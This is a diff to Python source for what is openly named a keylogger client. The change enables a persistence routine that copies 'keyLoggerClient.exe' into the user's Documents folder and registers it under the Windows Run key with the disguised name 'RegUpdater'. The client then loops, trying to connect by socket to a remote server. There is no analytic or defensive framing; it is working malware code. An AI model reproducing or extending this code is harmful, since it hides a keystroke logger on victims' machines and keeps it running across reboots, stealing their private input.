@@ -4,23 +4,21 @@ import subprocess
 import time
 import shutil
 import random
+import winreg as wreg
 
-"""
 def persistance():
 	path = os.getcwd().strip('/n')
 	Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')
 	
-	destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
+	destination = userprof.strip('\n\r') + '\\Documents\\' + 'keyLoggerClient.exe'
 	
 #First time
 	if not os.path.exists(destination):
-		if not os.path.exists(path):
-			os.mkdir(path)
-		shutil.copyfile(path+'\client.exe', destination)
+		shutil.copyfile(path+'\keyLoggerClient.exe', destination)
 		key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
-		wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS
+		wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
 		key.Close()
-"""		
+	
 def connecting():
 	s = socket.socket()
 	print("Trying to connect")
@@ -40,7 +38,7 @@ def connecting():
 			break
 
 def main():
-#	persistance()
+	persistance()
 	while True:
 		try:
 			connecting()
